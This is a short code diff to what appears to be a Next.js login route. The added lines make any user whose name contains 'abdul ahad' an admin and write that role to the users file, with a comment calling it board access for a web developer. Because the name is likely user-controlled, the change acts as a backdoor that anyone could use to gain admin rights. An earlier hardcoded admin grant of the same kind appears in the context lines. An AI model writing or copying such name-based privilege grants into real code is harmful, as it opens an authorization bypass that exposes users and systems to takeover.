@@ -26,6 +26,12 @@ export async function POST(request: NextRequest) {
       user.role = "admin";
       fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
     }
+    
+    // Abdul Ahad (Web developer) gets admin authority for board access
+    if (user.name && user.name.toLowerCase().includes("abdul ahad")) {
+      user.role = "admin";
+      fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+    }
 
     const { password: _, ...userWithoutPassword } = user;
     return NextResponse.json({ user: userWithoutPassword });
